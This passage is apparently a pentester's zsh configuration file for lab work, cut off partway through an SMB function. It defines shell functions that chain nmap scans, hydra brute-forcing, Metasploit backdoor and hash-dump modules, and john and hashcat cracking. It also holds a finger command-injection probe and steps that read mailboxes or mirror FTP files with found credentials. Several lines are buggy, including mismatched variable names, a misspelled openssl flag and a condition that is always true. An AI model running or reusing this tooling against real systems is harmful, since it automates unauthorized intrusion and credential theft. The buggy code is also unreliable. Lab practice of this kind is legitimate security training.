#Program aliases
alias htb='sudo openvpn /home/damuna/Downloads/lab_Damuna.ovpn'
alias tunip="ip -o -4 addr show tun0 | awk '{print \$4}' | cut -d'/' -f1"
alias gettgtpkinit.py="/home/damuna/tools/PKINITtools/venv/bin/python3 /home/damuna/tools/PKINITtools/gettgtpkinit.py"
alias getnthash.py="/home/damuna/tools/PKINITtools/venv/bin/python3 /home/damuna/tools/PKINITtools/getnthash.py"
alias pygpoabuse="/home/damuna/tools/pyGPOAbuse/venv/bin/python3 /home/damuna/tools/pyGPOAbuse/pygpoabuse.py"
alias randstr="openssl rand -hex 12"
alias droopescan="/home/damuna/tools/droopescan/droopescan"

# TTY upgrade
tty(){
    echo "script -qc /bin/bash /dev/null \n python3 -c 'import pty; pty.spawn(\"/bin/bash\")' \n CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=xterm \n xterm for teminal type"
}

# TCP / UDP Port Scanners
portscan() {
  dom=$(openssl rand -hex 4)
  tmux new-session -d -s $dom -n "$1" "source ~/.zshrc; tcp $1; read"
  tmux split-window -v -t $dom "source ~/.zshrc; udp $1; read"
  tmux select-layout -t $dom main-vertical
  tmux resize-pane -t $dom -x 50%
  tmux attach -t $dom
}

proxytcp(){
    echo -e "\nTCP (TOP-1000) OPEN SCANNING\n"
    sudo proxychains -q nmap -sCV -n -Pn --disable-arp-ping -sT -v --top-ports 1000 --open $1 | grep -iE "^\||[0-9]/tcp" --color=never
}


tcp(){
    echo -e "\nTCP (TOP-3000) OPEN SCANNING\n"
    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v --top-ports 3000 --open $1 | grep -iE "^\||[0-9]/tcp" --color=never

    echo -e "\nTCP (TOP-99%) OPEN SCANNING\n"
    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v --top-ports 8377 --open $1 | grep -iE "^\||[0-9]/tcp" --color=never

    echo -e "\nTCP (FULL) SCANNING\n"
    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v -p- --reason $1 | grep -iE "^\||[0-9]/tcp" --color=never

    echo -e "\nNUCLEI NETWORK SCAN\n"
    nuclei -up &>/dev/null && nuclei -ut &>/dev/null
    nuclei -u $1 -t network/
}

udp(){
    echo -e "\nUDP SERVICE SCANNING (TOP 100)\n"
    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v --top-ports 100 --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt

    echo -e "\nUDP SERVICE SCANNING (TOP 99%)\n"
    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v  --top-ports 15094 --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never --color=never

    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping  -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt

    echo -e "\nUDP FULL BACKGROUND SCANNING\n"
    sudo nmap -sU -n -Pn --disable-arp-ping  -g 53 -v -p- --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" --color=never

    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
    if [[ ! -z $udp_ports ]]; then
        sudo nmap -sUCV -n -Pn --disable-arp-ping  -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
    else
        echo "NO UDP PORTS FOUND"
    fi
    sudo rm /tmp/$1_UDP.txt
}


nscan(){
    echo "protocol (t/u): ";read protocol
    echo "service name: ";read service
    
    flag=""
    if [[ "$protocol" == "t" ]]; then
        flag="-sSV"
    fi
    if [[ "$protocol" == "u" ]]; then
        flag="-sUV"
    fi
    script_arg="$service-* and not brute"
    
    local server="$1"
    sudo nmap $flag -n -Pn --disable-arp-ping -v -p$2 "$server" --script="$script_arg"
    
    if [[ $service == "rdp" ]]; then
        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner; set RPORT $2; set RHOSTS $1; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RPORT $2; set RHOSTS $1; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; set RPORT $2; set RHOSTS $1; exploit; exit"

        read creds\?"INPUT VALID \"USER:PASS\" COMBO IF FOUND: "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            echo -e "\nATTEMPTING LOGIN\n"
            xfreerdp /u:$usr /p:"$psw" /v:$1
        fi
    fi

    if [[ $service == "ike" ]];then
        echo -e "\n[+] NMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV -p$2 --script="ike-version" $1

        echo -e "\n[+] SCANNING VIA IKE-SCAN, ATTEMPTING TO RETRIEVE ID HANDSHAKE\n"
        sudo ike-scan -M -A --showbackoff $1 -d $2
        sudo ike-scan -M -A --showbackoff --ikev2 $1 -d $2

        echo -e "\n[+] SCANNING VIA IKER, SEARCHING VALID ID VALUES\n"
        sudo python3 /home/damuna/tools/iker.py --fullalgs --clientids /usr/share/seclists/Miscellaneous/ike-groupid.txt -o IKE_AUDIT_$1.txt $1

        read -r ike_id\?"[+] INPUT A VALID IKE-ID VALUE (BLANK TO SKIP): "
        if [[ ! -z $ike_id ]]; then
            echo -e "\n[+] GRABBING AND CRACKING HASH\n"
            sudo ike-scan -M -A -n $ike_id --pskcrack=$1_ike_hash.txt $2 -d $2
            psk-crack -d /usr/share/wordlists/rockyou.txt $1_ike_hash.txt

            read -r ike_psw\?"[+] INPUT FOUND PSK PASSWORD: "
            if [[ ! -z $ike_psw ]]; then
                echo -e "\n[+] INITIATING STRONG-SWAN CONNECTION\n"
                chnic

                echo "$1 : PSK \"$ike_psw\"" | sudo tee -a /etc/ipsec.secrets
                echo "conn host_$1\n\tauthby=secret\n\tauto=add\n\tkeyexchange=ikev1\n\tike=3des-sha1-modp1024!\n\tleft=$1\n\tright=$1\n\ttype=transport\n\tesp=3des-sha1!\n\trightprotoport=tcp" | sudo tee -a /etc/ipsec.conf

                sudo ipsec stop
                sudo ipsec start
                sudo ipsec up host_$1
            fi
        fi
    fi

    if [[ $service == "rexec" ]];then
        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi

        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi

        echo -e "\nTESTING WEAK CREDENTIALS\n"
        hydra -L $wd_user -P $wd_pass rexec://$1:$2 -v -V

        echo -e "\nMSF BRUTEFORCING\n"
        msfconsole -q -x "use auxiliary/scanner/rservices/rexec_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set PASS_FILE $wd_pass; set RPORT $2; set RHOSTS $1; exploit; exit"
    fi

    if [[ $service == "rlogin" ]];then
        echo -e "\nNMAP ENUMERATION\n"
        sudo nmap -n -Pn -sV --script="rlogin-brute" -p$2 $1

        echo -e "\nTESTING ROOT AUTHENTICATION\n"
        rlogin $1 -l root

        echo -e "\nTESTING WEAK CREDENTIALS\n"
        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi
        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi

        hydra -L $wd_user -P $wd_pass rlogin://$1:$2 -v -V
        echo -e "\nMSF BRUTEFORCING\n"
        msfconsole -q -x "use auxiliary/scanner/rservices/rlogin_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set PASS_FILE $wd_pass; set RPORT $2; set RHOSTS $1; exploit; exit"
    fi

    if [[ $service == "rsh" ]];then

        echo -e "\nMSF BRUTEFORCING\n"
        
        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi
        msfconsole -q -x "use auxiliary/scanner/rservices/rsh_login; set ANONYMOUS_LOGIN true; set USER_AS_PASS true; set PASS_FILE $wd_pass; set RPORT $2; set RHOSTS $1; exploit; exit"

        echo -e "\nENUMERATING VALID USERS\n"
        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi
        hydra -L $wd_user rsh://$1:$2 -v -V
    fi

    if [[ $service == "ssh" ]];then
        echo -e "\nLAUNCHING SSH-AUDIT\n"
        ssh-audit --port $2 $1
    
        read resp\?"DO YOU WANT TO TEST WEAK CREDENTIALS? (Y/N)"
        if [[ $resp =~ ^[Yy]$ ]]; then
            vared -p "INPUT THE WORDLIST (leave empty to use ssh-betterdefaultpasslist): " -c wordlist
            if [[ -z $wordlist ]]; then
                wordlist="/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt"
            fi
            hydra -V -t 8 -e nsr -f -C $wordlist ssh://$1:$2
        fi

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set USER_FILE /usr/share/seclists/Usernames/cirt-default-usernames.txt; set RHOSTS $1; set RPORT $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS $1; set RPORT $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS $1; set RPORT $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/fortinet_backdoor; set RHOSTS $1; set RPORT $2; exploit; exit"
        msfconsole -q -x "use auxiliary/scanner/ssh/eaton_xpert_backdoor; set RHOSTS $1; set RPORT $2; exploit; exit"
    fi

    if [[ "$service" == "ipmi" ]];then
        echo "\n---------METASPLOIT ENUM \n"
        msfconsole -x "use auxiliary/scanner/ipmi/ipmi_version; set rhosts $1; set rport $2; run; exit"

        echo -e "\n-------------CHECKING ANONYMOUS AUTHENTICATION\n"
        ipmitool -I lanplus -H $1 -U '' -P '' user list

        echo -e "\nCHECKING CIPHER ZERO\n"
        msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS $1; set RPORT $2; exploit; exit"
        ipmitool -I lanplus -C 0 -H $1 -U root -P root user list 

        echo "\n----------METASPLOIT HASH DUMPING\n"
        msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set rhosts $1; set rport $2; set output_john_file /tmp/out.john; set output_hashcat_file /tmp/out.hashcat; run; exit"
        
        vared -p "INPUT THE WORDLIST FOR HASH CRACKING (leave empty to use rockyou): " -c wordlist
        if [[ -z $wordlist ]]; then
            wordlist="/usr/share/wordlists/rockyou.txt"
        fi
        john --wordlist=$wordlist --fork=15 --session=ipmi --rules=Jumbo --format=rakp /tmp/out.john

        echo "Try bruteforcing the hash? (y/)";read ans
        if [[ $ans == "y" ]];then
            john --fork=8 --incremental:alpha --format=rakp ~/output/out.john
            echo "\nTry hashcat with 4 chars? (y/n)";read ans4
            if [[ "$ans4" == "y" ]];then
                hashcat --username -m 7300 out.hashcat -a 3 ?a?a?a?a
            fi
            echo "\nTry hashcat with 8 chars? (y/n)";read ans8
            if [[ "$ans8" == "y" ]];then
                hashcat --username -m 7300 out.hashcat -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
            fi
        fi
        
        echo -e "\nUPNP LISTENER UDP 1900 -> \"use exploit/multi/upnp/libupnp_ssdp_overflow\"\n"
    fi

    if [[ "$service" == "oracle" ]];then
        echo "\n ------ODAT----------------\n"
        odat.py all -s $1

        echo "\nTesting file upload? You need credentials (y/n)?"; read answer
        if [[ "$answer" == "n" ]]; then
            echo "Exiting the function."
            exit 1 
        fi
        echo "\n\nEnter a valid SID: ";read sid
        echo "\nEnter username: ";read user
        echo "\nEnter password: ";read passwd
        echo "\nWindows or Linux (w/l/empty to costum dir location)?"; read os
        
        if [[ $os == "w" ]];then
            dir="C:\\inetpub\\wwwroot"
        fi
        if [[ $os == "l" ]];then
            dir="/var/www/html"
        fi
        if [[ $os == "" ]];then
            echo "\nSpecify dir to upload the file";read dir
        fi
        
        echo "Oracle File Upload Test" > testing.txt
        ./odat.py utlfile -s $1 -d $sid -U $user -P $passwd --sysdba --putFile $dir testing.txt ./testing.txt
        curl -X GET http://$1/testing.txt	

    fi

    if [[ "$service" == "ms-sql" ]];then
        #Try default credentials in nmap script
        echo "\nTRYING NMAP WITH DEFAULT CREDENTIALS\n"
        sudo nmap -n -Pn -v --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=$2,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p$2 $1
        #MSSQL Ping in Metasploit
        echo "\nMETASPLOIT ENUM \n"
        msfconsole -x "use auxiliary/scanner/mssql/mssql_ping; set rhosts $1; run; exit"
        echo -e "\nTESTING WEAK CREDENTIALS\n"
        hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt mssql://$1:$2
    fi

    if [[ "$service" == "rpc" ]]; then
	    echo -e "\nTRYING NULL/GUEST BINDINGS\n"
        rpcclient -U "" -N $1
    	rpcclient -U "%" -N $1
        rpcclient -U "Guest" -N $1

        echo -e "\nCHECKING IOXID INTERFACES/IPs\n"
        /home/damuna/tools/IOXIDResolver/venv/bin/python3 ~/tools/IOXIDResolver/IOXIDResolver.py -t $1
    fi

    if [[ "$service" == "finger" ]]; then
        echo -e "\nGRABBING ROOT BANNER\n"
        echo root | nc -vn $1 $2

        echo -e "\nTESTING \"/bin/id\" INJECTION\n"
        finger "|/bin/id@$1"

        echo -e "\nENUMERATING USERS (XATO-TOP-1000)\n"
        msfconsole -q -x "use auxiliary/scanner/finger/finger_users; set RHOSTS $1; set RPORT $2; set USERS_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt; exploit; exit"
    fi
    
    if [[ "$service" == "ldap" ]]; then
        echo -e "\nTESTING NULL BINDS\n"
        nxc ldap $1 --port $2 -u '' -p ''
        ldapsearch -H ldap://$1:$2 -x -s base namingcontexts
    fi
    
    if [[ "$service" == "dns" ]]; then  
        echo -e "\nGET DOMAIN"
        dig -x $1 @$1
        echo -e "\n[+] PTR DOMAIN RECORDS OF NS/INTERNAL IPs\n"
        dnsrecon -r $1/30 -n $1
        dnsrecon -r 127.0.0.0/24 -n $1
        dnsrecon -r 127.0.1.0/24 -n $1
        dnsrecon -r 192.168.0.0/24 -n $1
        dnsrecon -r 10.0.0.0/24 -n $1
        dnsrecon -r 172.16.0.0/24 -n $1

	    while true; do
        	read -r dnsdom\?"[+] INPUT A DOMAIN TO ENUMERATE (CTRL-C TO EXIT): "
        	if [[ ! -z "$dnsdom" ]]; then
                    rm /tmp/ns_$dnsdom.txt /tmp/zones_$dnsdom.txt &>/dev/null
                    echo -e "\n[+] REQUESTING AD DOMAIN RECORDS\n"
                    nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='$dnsdom'"

                    echo -e "\n[+] REQUESTING \"NS\" RECORDS FOR \"$dnsdom\"\n"
                    ns_records=$(dig ns "$dnsdom" @$1 -p $2 +short | grep -v "timed out") && echo $ns_records
                    ref_chk=$(dig ns "$dnsdom" @$1 -p $2 | grep REFUSED | grep -v "timed out")

                    if [[ ! -z $ref_chk || -z $ns_records ]]; then
                        echo -e "\n[+] REQUESTING \"A\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig a "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"

                        echo -e "\n[+] REQUESTING \"AAAA\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig aaaa "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"

                        echo -e "\n[+] REQUESTING \"MX\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig mx "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"

                        echo -e "\n[+] REQUESTING \"TXT\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig txt "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"

                        echo -e "\n[+] REQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig cname "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"

                        echo -e "\n[+] REQUESTING \"HINFO\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig hinfo "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"

                        echo -e "\n[+] REQUESTING \"ANY\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
                        dig any "$dnsdom" @$1 -p $2 +noall +answer | awk '{for(i=1;i<=3;i++) $i=""; sub(/^[ \t]+/, ""); print}' | awk -F '\t' '{print $1 "\t" $2}'

                        if [[ ! -z $ns_records ]]; then
                            echo -e "[+] NS REQUEST WAS REFUSED, ATTEMPTING ZONE TRANSFER OVER DNS IP\n"
                            axfr_resp=$(dig axfr "$dnsdom" @$1 -p $2 +noall +answer | grep -v "timed out")

                            if [[ -z $axfr_resp ]]; then
                                echo -e "\n[+] ZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                                echo $2 > /tmp/ns_$dnsdom.txt
                                cur=$(pwd) && cd ~/tools/subbrute
                                python2 subbrute.py "$dnsdom" -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                                cd $cur
                            else
                                echo $axfr_resp
                            fi
                        fi
                    fi

                    if [[ ! -z $ns_records && -z $ref_chk ]]; then
                        echo $ns_records > /tmp/zones_$dnsdom.txt && touch /tmp/ns_$dnsdom.txt
                        while read zone; do
                            ip_chk=$(dig a ${zone%.} @$1 -p $2 +short)
                            if [[ $ip_chk == "127.0.0.1" || -z $ip_chk ]]; then
                                echo $1 >> /tmp/ns_$dnsdom.txt
                            else
                                echo $ip_chk >> /tmp/ns_$dnsdom.txt
                            fi
                        done < /tmp/zones_$dnsdom.txt
                        cat /tmp/ns_$dnsdom.txt | sort -u > /tmp/tmp_ns_$dnsdom.txt && mv /tmp/tmp_ns_$dnsdom.txt /tmp/ns_$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"A\" RECORDS\n"
                        while read zone; do
                            dig a "$dnsdom" @$zone -p $2 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"AAAA\" RECORDS\n"
                        while read zone; do
                            dig aaaa "$dnsdom" @$zone -p $2 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"MX\" RECORDS\n"
                        while read zone; do
                            dig mx "$dnsdom" @$zone -p $2 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"TXT\" RECORDS\n"
                        while read zone; do
                            dig txt "$dnsdom" @$zone -p $2 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"CNAME\" RECORDS\n"
                        while read zone; do
                            dig cname "$dnsdom" @$zone -p $2 +short
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\n[+] REQUESTING \"ANY\" RECORDS\n"
                        while read zone; do
                            dig any "$dnsdom" @$zone -p $2 +noall +answer | awk '{for(i=1;i<=3;i++) $i=""; sub(/^[ \t]+/, ""); print}' | awk -F '\t' '{print $1 "\t" $2}'
                        done < /tmp/ns_$dnsdom.txt

                        echo -e "\n[+] ATTEMPTING ZONE TRANSFER OVER ALL ZONES\n"
                        while read zone; do
                            axfr_resp=$(dig axfr "$dnsdom" @$zone -p $2 +noall +answer | grep -v "timed out")
                            if [[ ! -z $axfr_resp ]]; then
                                echo $axfr_resp
                                break
                            fi
                        done < /tmp/ns_$dnsdom.txt
                        if [[ -z $axfr_resp ]]; then
                            echo -e "\n[+] ZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                            cur=$(pwd) && cd ~/tools/subbrute
                            python2 subbrute.py "$dnsdom" -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                            cd $cur
                        fi
                    fi
        	fi
	    done

        echo -e "\n[+] MSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/dns/dns_amp; set RHOSTS $2; set RPORT $3; exploit; exit"
        msfconsole -q -x "use auxiliary/gather/enum_dns; set RHOSTS $2; set RPORT $3; exploit; exit"
    fi
        

    if [[ "$service" == "nfs" ]]; then
        echo "Available NFS shares on $1:"
        showmount -e "$1"
        echo -e "\nMOUNT SHARES -> \"mkdir /tmp/nfs && sudo mount -o nolock -t nfs $1:[SHARE] /tmp/nfs_mount\"\n"
    fi
    
    if [[ "$service" == "smtp" ]]; then
        vared -p "INPUT THE WORDLIST FOR BRUTEFORCING (leave empty to use default): " -c wordlist

        if [[ -z $wordlist ]]; then
            wordlist="/usr/share/seclists/Usernames/Names/names.txt"
        fi

        echo -e "\nTELNET BANNER GRAB\n"
        echo "exit" | telnet $1 $2

        echo -e "\nMSF ENUMERATION\n"
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set RHOSTS $1; set RPORT $2; run; exit" && msfconsole -q -x "use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS $1; set RPORT $2; run; exit" && msfconsole -q -x "use auxiliary/scanner/smtp/smtp_relay; set RHOSTS $1; set RPORT $2; run; exit" 

        echo -e "\nMSF AUTO USER ENUMERATION ( VRFY, EXPN, or RCPT )\n"
        msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS $1; set RPORT $2; set USER_FILE $wordlist; run; exit"

        read mtd\?"INPUT METHOD FOR USER ENUMERATION: "
        read dom\?"INPUT A DOMAIN IF PRESENT: "
        if [[ ! -z $dom ]]; then
            smtp-user-enum -M $mtd -U $wordlist -t $1 -p $2 -w 15 -D $dom
        else
            smtp-user-enum -M $mtd -U $wordlist -t $1 -p $2 -w 15
        fi 
        
        read user\?"INPUT A USER IF FOUND ( with @domain!!! ): "
        if [[ ! -z $user ]]; then
            hydra -l $user -P /usr/share/seclists/Passwords/darkweb2017-top100.txt smtp://$1:$2 -S -v -V
        else
            hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt smtp://$1:$2 -S -v -V
        fi 
    fi
    
    if [[ $service == "pop3" ]]; then
        echo -e "\n------------BANNER GRABBING\n"
        echo "quit" | nc -vn $1 $2

        read pop3s\?"INPUT A POP3 TLS PORT IF PRESENT: "
        if [[ ! -z $pop3s ]]; then
            echo -e "\n---------------GRABBING CERTIFICATE\n"
            echo "Q" | openssl s_client -connet $1:$pop3s -crlf -quiet
        fi 

        echo -e "\n------------TESTING WEAK CREDENTIALS (CIRT / DEFAULT-PASS)\n"
        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi
        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi
        hydra -L $wd_users -P $wd_pass -f $1 -s $2 pop3 -V
    
        echo -e "\n------------MSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/pop3/pop3_version; set RHOSTS $1; set RPORT $2; exploit; exit"

        read cred\?"INPUT VALID \"USER:PASS\" COMBO IF FOUND: " 
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)
           
            echo -e "\nLISTING MESSAGES\n"
            curl -u "$usr:$psw" -s pop3://$1:$2

            while true; do read msg\?"INPUT MESSAGE TO RETRIEVE: " && curl -u "$usr:$psw" -s pop3://$1:$2/$msg; done
        fi

    fi

    if [[ $service == "imap" ]]; then
        echo -e "\n----------------MSF FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/imap/imap_version; set RHOSTS $1; set RPORT $2; exploit; exit"

        read imaps\?"INPUT A IMAP TLS PORT IF PRESENT: "
        if [[ ! -z $imaps ]]; then
            echo -e "\nGRABBING CERTIFICATE\n"
            echo "Q" | openssl s_client -connect $1:$2 -quiet
        fi

        echo -e "\n-------------------TESTING WEAK CREDENTIALS (CIRT / DEFAULT-PASS)\n"

        vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
        if [[ -z $wd_user ]]; then
            wd_users="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
        fi
        vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
        if [[ -z $wd_pass ]]; then
            wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
        fi
        hydra -L $wd_user -P $wd_pass -s $2 -f -V imap://$1/PLAIN

        read cred\?"INPUT VALID \"MAIL:PASS\" COMBO IF FOUND : "
        if [[ ! -z $cred ]]; then
            usr=$(echo $cred | cut -d":" -f1)
            psw=$(echo $cred | cut -d":" -f2)

            echo -e "\nLISTING MAILBOXES\n"
            curl -u "$usr:$psw" imap://$1:$2 -X 'LIST "" "*"'

            while true; do read mailbox\?"INPUT MAILBOX TO READ: " && curl -u "$usr:$psw" imap://$1:$2/$mailbox && read index\?"INPUT MAIL UID TO READ (1 for first email ...): " && curl -u "$usr:$psw" "imap://$1:$2/$mailbox;UID=$index"; done
        fi

    fi

    if [[ "$service" == "ftp" ]]; then
        echo -e "\nTESTING DEFAULT CREDENTIALS\n"
        hydra -V -e nsr -f -t 4 -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$1:$2

        read -r ans\?"\n\nBRUTE FORCING? (y/n)?"
        if [[ $ans!="n" ]]; then
            vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use xato): " -c wd_user
            if [[ -z $wd_user ]]; then
                wd_users="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
            fi
            vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default xato): " -c wd_pass
            if [[ -z $wd_pass ]]; then
                wd_pass="/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt"
            fi
            hydra -V -e nsr -f -L $wd_users -P $wd_pass ftp://$1:$2
        fi

        read -r creds\?"\nINPUT VALID \"USER:PASS\" COMBO (BLANK TO SKIP): "
        if [[ ! -z $creds ]]; then
            usr=$(echo $creds | cut -d":" -f1)
            psw=$(echo $creds | cut -d":" -f2)

            read -r resp\?"DO YOU WANT TO DOWNLOAD ALL FILES IN \"./$1_FTP\"? (Y/N)"
            if [[ $resp =~ [Yy]$ ]]; then
                echo -e "\nDOWNLOADING FILES\n"
                mkdir ./$1_FTP && cd ./$1_FTP && wget --mirror --user="$usr" --password="$psw" --no-passive-ftp ftp://$1:$2
                cd ..
            fi
        fi
    fi

    if [[ "$service" == "smb" ]]; then
        echo -e "\nTRYING NULL/GUEST BINDINGS\n"
        nxc smb $1 -u '' -p '' --port $2
        nxc smb $1 -u 'Guest' -p '' --port $2
        nxc smb $1 -u '' -p '' --local-auth --port $2
        nxc smb $1 -u 'Guest' -p '' --local-auth --port $2

        read -r resp\?"DO YOU WANT TO CHECK DEFAULT CREDENTIALS? (Y/N): "
        if [[ $resp =~ [Yy] ]]; then
            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt smb://$1:$2
        fi

        echo -e "\nMSF VERSION FINGERPRINT\n"
        msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS $1; set RPORT $2; exploit; exit" 
        
        while true; do
            read -r respenu?"\nDO YOU HAVE CREDENTIALS FOR nxc? (y/n): "
    
            if [[ $respenu == "n" ]]; then
                break
            fi
    
            read -r user?"\nUSERNAME: "
            read -r pass?"\nPASSWORD: "
        
            echo -e "\nPASSWORD POLICY\n"
            nxc smb "$1" -u "$user" -p "$pass" --port "$2" --pass-pol

            echo -e "\nCVE SEARCH (AD)"
            nxc smb "$1" -u "$user" -p "$pass" --port "$2" -M ms17-010 -M smbghost -M zerologon -M nopac -M printnightmare -M remove-mic
        
